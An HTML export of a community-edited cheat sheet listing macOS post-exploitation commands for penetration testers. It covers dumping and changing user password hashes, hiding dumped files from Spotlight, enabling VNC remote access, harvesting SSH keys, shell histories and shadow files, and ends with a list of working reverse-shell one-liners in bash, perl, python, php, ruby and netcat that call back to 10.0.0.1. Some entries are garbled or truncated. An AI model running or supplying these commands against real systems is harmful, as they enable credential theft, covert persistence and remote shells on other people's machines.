<html><head><title>OSX Post-Exploitation</title><style type="text/css">ol{margin:0;padding:0}.c27{list-style-type:decimal;margin:0;padding:0}.c7{list-style-type:disc;margin:0;padding:0}.c18{list-style-type:lower-latin;margin:0;padding:0}.c1{padding-left:0pt;direction:ltr;margin-left:36pt}.c26{max-width:504pt;background-color:#ffffff;padding:54pt 54pt 54pt 54pt}.c8{list-style-type:circle;margin:0;padding:0}.c15{padding-left:0pt;margin-left:72pt}.c5{font-size:24pt;font-weight:bold}.c20{color:#333333;background-color:#ffffff}.c2{direction:ltr;margin-left:18pt}.c25{color:#222222;background-color:#ffffff}.c24{padding-left:0pt;margin-left:4.5pt}.c12{color:#000099;text-decoration:underline}.c0{color:inherit;text-decoration:inherit}.c9{color:#1155cc;text-decoration:underline}.c4{height:11pt;direction:ltr}.c23{text-decoration:underline}.c19{text-align:justify}.c21{height:18pt}.c16{font-size:9pt}.c22{padding-bottom:10pt}.c6{direction:ltr}.c3{font-size:14pt}.c10{text-align:right}.c13{font-weight:bold}.c17{color:#ff0000}.c11{text-indent:36pt}.c14{text-align:center}.title{padding-top:24pt;line-height:1.15;text-align:left;color:#000000;font-size:36pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}.subtitle{padding-top:18pt;line-height:1.15;text-align:left;color:#666666;font-style:italic;font-size:24pt;font-family:"Georgia";padding-bottom:4pt}li{color:#000000;font-size:11pt;font-family:"Arial"}p{color:#000000;font-size:11pt;margin:0;font-family:"Arial"}h1{padding-top:24pt;line-height:1.15;text-align:left;color:#000000;font-size:24pt;font-family:"Arial";font-weight:bold;padding-bottom:6pt}h2{padding-top:18pt;line-height:1.15;text-align:left;color:#000000;font-size:18pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h3{padding-top:14pt;line-height:1.15;text-align:left;color:#000000;font-size:14pt;font-family:"Arial";font-weight:bold;padding-bottom:4pt}h4{padding-top:12pt;line-height:1.15;text-align:left;color:#000000;font-size:12pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h5{padding-top:11pt;line-height:1.15;text-align:left;color:#000000;font-size:11pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}h6{padding-top:10pt;line-height:1.15;text-align:left;color:#000000;font-size:10pt;font-family:"Arial";font-weight:bold;padding-bottom:2pt}</style></head><body class="c26"><p class="c6 c10 c11"><span class="c5">OS X Po</span><span class="c5">st-Exploitation Command List</span></p><p class="c6 c14"><span class="c3">If for any reason you cannot access/edit these files in the future, please contact </span><span class="c12 c3">mubix@hak5.org</span></p><p class="c6 c14"><span class="c3">You can download these files in any format using Google Doc&rsquo;s File-&gt;Download As method</span></p><p class="c6 c14"><span class="c3">If you are viewing this on anything other than Google Docs then you can get access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and Windows docs here:c</span></p><p class="c6 c14"><span class="c3 c17">DISCLAIMER: Anyone can edit these docs, and all that entails and implies</span></p><h4 class="c6 c14"><a name="h.n5c6jwvxwrzn"></a><span class="c17">&nbsp;</span></h4><p class="c4 c14"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><h2 class="c6"><a name="h.fzpfd5vtaii5"></a><span>Table of Contents</span></h2><p class="c4"><span></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.fzpfd5vtaii5">Table of Contents</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.5y4eyawqsnkb">Blind Files</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.4a2l63h4nc0g">SYSTEM</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.rex4ao8g82py">Networking</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.tetuy5g88en6">Configs</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.yw4n75cerl50">Packages</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.qye0dwlq54m">Finding Important Files</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.ylx0u55ysmk0">Files to pull</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.t52kkp9zuadd">Remote System Access</a></span></p><p class="c2"><span class="c9"><a class="c0" href="#h.4hig80dc0yjf">Priv</a></span></p><p class="c4 c22"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><p class="c4"><span></span></p><h2 class="c6"><a name="h.5y4eyawqsnkb"></a><span>Blind Files </span></h2><p class="c6"><span>(things to pull when all you can do is blindly read) LFI/dir traversal</span></p><ol class="c7" start="1"><li class="c1"><span>/etc/resolv.conf (everyone always has read on this and it wont trigger an IDS)</span></li></ol><p class="c4"><span></span></p><h2 class="c6"><a name="h.4a2l63h4nc0g"></a><span>SYSTEM</span></h2><ol class="c7" start="1"><li class="c1"><span>uname -a</span></li><li class="c1"><span>sw_vers -productName</span></li><li class="c1"><span>sw_vers -productVersion</span></li><li class="c1"><span>system_profiler</span></li><li class="c1"><span>defaults read com.apple.recentitems RecentApplications | grep Name</span></li><li class="c1"><span>defaults read com.apple.recentitems RecentDocuments | grep Name</span></li><li class="c1"><span>mdfind</span></li><li class="c1"><span>id</span></li><li class="c1"><span>printenv</span></li><li class="c1"><span>who</span></li><li class="c1"><span>ps aux</span></li><li class="c1"><span>ps ea</span></li><li class="c1"><span>e</span><span>bob (read password hash of bob)</span></li><li class="c1"><span class="c25">dscl localhost -read /Search/Users/bob ShadowHashData | tail -1 | xxd -r -p | plutil -convert xml1 -o - - (Dump in workable format)</span></li><li class="c1"><span>dscl localhost -passwd /Search/Users/bob (change bob&rsquo;s password without needing current)</span></li><li class="c1"><span>dscl . -read /Users/&lt;username&gt; ShadowHashData | cut -f9-25 -d&quot; &quot; | cut -f3 -d &quot;:&quot; | tr -d &#39; &#39;</span></li><li class="c1"><span>/Library/Application Support/VMware Fusion/vmrun list</span></li></ol><ol class="c8" start="1"><li class="c15 c6"><span>/Library/Application Support/VMware Fusion/vmrun CopyFileFromHostToGuest windowsmalicious.exe aWindowsVM</span></li><li class="c15 c6"><span>/Library/Application Support/VMware Fusion/vmrun captureScreen WindowsVM</span></li></ol><ol class="c7" start="18"><li class="c1"><span>mdutil -i off / (turn off SpotLight indexing on / - replace &lsquo;off&rsquo; with &lsquo;on&rsquo; to turn it back on - useful if you want to not have any files you dump locally indexed - replace &lsquo;/&rsquo; with &lsquo;volumeName&rsquo; if not working on boot volume)</span></li><li class="c1"><span>Snow Leopard and Lion</span></li></ol><ol class="c8" start="1"><li class="c15 c6"><span>dscacheutil -q user</span></li><li class="c15 c6"><span>dscacheutil -q group</span></li></ol><ol class="c7" start="20"><li class="c1"><span>Tiger</span></li></ol><ol class="c8" start="1"><li class="c15 c6"><span>lookupd -q user</span></li><li class="c6 c15"><span>lookupd -q group<br></span></li></ol><h2 class="c6"><a name="h.rex4ao8g82py"></a><span>Networking</span></h2><ol class="c7" start="1"><li class="c1"><span>ifconfig</span></li><li class="c1"><span>netstat -np tcp</span></li><li class="c1"><span>netstat -np udp</span></li></ol><p class="c4"><span></span></p><h2 class="c6"><a name="h.tetuy5g88en6"></a><span>Configs</span></h2><ol class="c7" start="1"><li class="c1"><span>ls -alh /private/etc/</span></li><li class="c1"><span>ls -alh /Library/Application Support/VMware Fusion/</span></li></ol><p class="c4"><span></span></p><h2 class="c6"><a name="h.yw4n75cerl50"></a><span>Packages</span></h2><ol class="c7" start="1"><li class="c1"><span>port installed</span></li><li class="c1"><span>ls -alh /Applications/</span></li></ol><p class="c4"><span></span></p><h2 class="c6"><a name="h.qye0dwlq54m"></a><span>Finding Important Files</span></h2><ol class="c7" start="1"><li class="c1"><span>ls -ma ~/</span></li><li class="c1"><span>ls -alh /Users/</span></li><li class="c1"><span>ls -alh /Users/*/.ssh/</span></li><li class="c1"><span>ls -alh /Users/*/.gnupg/</span></li><li class="c1"><span>ls -alh /Volumes/</span></li></ol><p class="c4"><span></span></p><h2 class="c6"><a name="h.ylx0u55ysmk0"></a><span>Files to Pull</span></h2><h2 class="c6 c21"><a name="h.j9nyyhb6vzjz"></a></h2><h2 class="c6"><a name="h.t52kkp9zuadd"></a><span>Remote System Access</span></h2><ol class="c7" start="6"><li class="c1"><span class="c12"><a class="c0" href="http://support.apple.com/kb/HT2370">http://support.apple.com/kb/HT2370</a></span><span>&nbsp;instructions to use kickstart to turn on vnc from the commandline (only works as an admin)</span></li><li class="c1"><span class="c20">$ sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users admin -privs -all -restart -agent -menu (enable vnc access)</span></li><li class="c1"><span class="c20">$ sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -configure -access -off (kill vnc server)</span></li></ol><p class="c4"><span></span></p><p class="c4"><span></span></p><h2 class="c6"><a name="h.4hig80dc0yjf"></a><span>Priv</span></h2><ol class="c7" start="1"><li class="c1"><span>cat /Library/Application Support/Objective Development/Little Snitch/rules.xpl</span></li><li class="c1"><span>ls</span></li></ol><p class="c4"><span class="c13"></span></p><p class="c4"><span class="c13"></span></p><p class="c6"><span class="c13">The current Linux list: </span></p><p class="c6"><span class="c13">(lets remove anything that doesn&rsquo;t work (or doesn&rsquo;t mean anything) on OS X),</span><span class="c23 c13">&nbsp;</span></p><p class="c4"><span class="c13 c23"></span></p><p class="c6"><span class="c23 c13">Please indicate the version of OS X on which the command works)</span></p><p class="c4"><span></span></p><p class="c6"><span># System</span></p><ol class="c7" start="1"><li class="c1"><span>uname -a</span></li><li class="c1"><span>ps aux</span></li><li class="c1"><span>ps -aef</span></li><li class="c1"><span>id</span></li><li class="c1"><span>arch</span></li><li class="c1"><span>w</span></li><li class="c1"><span>who -a</span></li><li class="c1"><span>gcc -v</span></li><li class="c1"><span>mysql --version</span></li><li class="c1"><span>perl -v</span></li><li class="c1"><span>ruby -v</span></li><li class="c1"><span>python --version</span></li><li class="c1"><span>df -k</span></li><li class="c1"><span>mount</span></li><li class="c1"><span>last -a</span></li><li class="c1"><span>lastlogin (*bsd)</span></li><li class="c1"><span>getenforce &nbsp;&lt;- does not work on Lion no idea if this work in previous versions</span></li><li class="c1"><span>dmesg</span></li><li class="c1"><span>lsusb&lt;- does not work on Lion no idea it this work on previous versions</span></li><li class="c1"><span>lshw &nbsp;&lt;- does not work on Lion no idea it this work on previous versions</span></li><li class="c1"><span>free -m &nbsp;&lt;- does not work on Lion no idea it this work on previous versions</span></li><li class="c1"><span>du -h --max-depth=1 /</span></li><li class="c1"><span>which nmap (see if it&rsquo;s already installed)</span></li><li class="c1"><span>locate bin/nmap</span></li><li class="c1"><span>which nc (see if it&rsquo;s already installed)</span></li><li class="c1"><span>locate bin/&lt;whatever you want&gt;</span></li><li class="c1"><span>whoami</span></li><li class="c1"><span>jps -l</span></li><li class="c1"><span>java -version</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Networking</span></p><ol class="c7" start="1"><li class="c1"><span>hostname -f</span></li><li class="c1"><span>ip addr show</span></li><li class="c1"><span>ifconfig -a</span></li><li class="c1"><span>route -n</span></li><li class="c1"><span>cat /etc/network/interfaces</span></li><li class="c1"><span>iptables -L -n</span></li><li class="c1"><span>netstat -anop</span></li><li class="c1"><span>netstat -r</span></li><li class="c1"><span>netstat -nltupw (root with raw sockets)</span></li><li class="c1"><span>arp -a</span></li><li class="c1"><span>lsof -nPi</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Configs</span></p><ol class="c7" start="1"><li class="c1"><span>ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; | grep -v lrwx 2&gt;/dev/null</span></li><li class="c1"><span>cat /etc/issue{,.net}</span></li><li class="c1"><span>cat /etc/passwd</span></li><li class="c1"><span>cat /etc/shadow (gotta try..)</span></li><li class="c1"><span>cat /etc/shadow~ # (sometimes there when edited with gedit)</span></li><li class="c1"><span>cat /etc/master.passwd</span></li><li class="c1"><span>cat /etc/group</span></li><li class="c1"><span>cat /etc/hosts</span></li><li class="c1"><span>cat /etc/crontab</span></li><li class="c1"><span>cat /etc/sysctl.conf</span></li><li class="c1"><span>for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)</span></li><li class="c1"><span>cat /etc/resolv.conf</span></li><li class="c1"><span>cat /etc/samba/smb.conf</span></li><li class="c1"><span>pdbedit -L -w</span></li><li class="c1"><span>pdbedit -L -v</span></li><li class="c1"><span>cat /etc/exports</span></li><li class="c1"><span>cat /etc/auto.master</span></li><li class="c1"><span>cat /etc/auto_maste</span></li><li class="c1"><span>cat /etc/fstab</span></li><li class="c1"><span>cat /etc/exports</span></li><li class="c1"><span>find /etc/sysconfig/ -type f -exec cat {} \;</span></li><li class="c1"><span>cat /etc/sudoers</span></li></ol><p class="c4"><span></span></p><p class="c6 c19"><span># Package Sources</span></p><ol class="c7" start="1"><li class="c1"><span>cat /etc/apt/sources.list</span></li></ol><ol class="c7" start="1"><li class="c1"><span>ls -l /etc/yum.repos.d/</span></li><li class="c1"><span>cat &nbsp;/etc/yum.conf</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Finding Important Files</span></p><ol class="c7" start="1"><li class="c1"><span>find /var/log -type f -exec ls -la {} \;</span></li><li class="c1"><span>ls -alhtr /mnt</span></li><li class="c1"><span>ls -alhtr /Volumes</span></li><li class="c1"><span>ls -alhtr /tmp</span></li><li class="c1"><span>ls -alhtr /home</span></li><li class="c1"><span>ls /Users/*/.ssh/*</span></li><li class="c1"><span>find /home -type f -iname &#39;.*history&#39;</span></li><li class="c1"><span>ls -lart /etc/rc.d/</span></li><li class="c1"><span>locate tar | grep [.]tar$</span></li><li class="c1"><span>locate tgz | grep [.]tgz$</span></li><li class="c1"><span>locate sql l grep [.]sql$</span></li><li class="c1"><span>locate settings | grep [.]php$</span></li><li class="c1"><span>locate config.inc | grep [.]php$</span></li><li class="c1"><span>ls /Users/*/id*</span></li><li class="c1"><span>locate .properties | grep [.]properties # java config files</span></li><li class="c1"><span>locate .xml | grep [.]xml # java/.net config files</span></li><li class="c1"><span>find /sbin /usr/sbin /opt /lib `echo $PATH | &lsquo;sed s/:/ /g&rsquo;` -perm -4000 # find suids</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Per User</span></p><ol class="c7" start="1"><li class="c1"><span>ls -alh /Users/*/</span></li><li class="c1"><span>ls -alh /Users/*/.ssh/</span></li><li class="c1"><span>cat /Users/*/.ssh/authorized_keys</span></li><li class="c1"><span>cat /Users/*/.ssh/known_hosts</span></li><li class="c1"><span>cat /Users/*/.*hist*</span></li><li class="c1"><span>find -type f /Users/*/.vnc /Users/*/.subversion</span></li><li class="c1"><span>grep ^ssh /Users/*/.*hist*</span></li><li class="c1"><span>grep ^telnet `/Users/*/.*hist*</span></li><li class="c1"><span>grep ^mysql /Users/*/.*hist*</span></li><li class="c1"><span>cat /Users/*/.viminfo</span></li></ol><ol class="c7" start="1"><li class="c1"><span>sudo -l # if sudoers is not readable, this sometimes works per user</span></li><li class="c1"><span>crontab -l</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Priv (sudo&rsquo;d or as root)</span></p><ol class="c7" start="1"><li class="c1"><span>ls -alh /root/</span></li><li class="c1"><span>cat /etc/sudoers</span></li><li class="c1"><span>cat /etc/shadow</span></li><li class="c1"><span>cat /etc/master.passwd # OpenBSD</span></li><li class="c1"><span>cat /var/spool/cron/crontabs/*</span></li><li class="c1"><span>lsof -nPi</span></li><li class="c1"><span>ls /Users/*/.ssh/*</span></li></ol><p class="c4"><span></span></p><p class="c6"><span># Reverse Shell</span></p><p class="c6"><span>starting list sourced from:</span><span><a class="c0" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">&nbsp;</a></span><span class="c12"><a class="c0" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></span></p><ol class="c7" start="1"><li class="c1"><span>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 # No /dev/tcp on Mac OS X</span></li><li class="c1"><span>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span></li><li class="c1"><span>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></li><li class="c1"><span>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></li><li class="c1"><span>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span></li></ol><ol class="c27" start="1"><li class="c24 c6"><span>nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore</span></li></ol><ol class="c18" start="1"><li class="c24 c6"><span>rm /tmp/;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span></li></ol><ol class="c7" start="6"><li class="c24 c6"><span>xterm -display 10.0.0.1:1</span></li></ol><ol class="c8" start="1"><li class="c6 c24"><span>Listener- &nbsp; &nbsp; Xnest :1</span></li><li class="c24 c6"><span>Add permission to connect- &nbsp;xhost +victimIPf</span></li></ol><div><p class="c6 c10"><span class="c13 c16">OS X Post Exploitation Command List - Page: </span></p></div></body></html>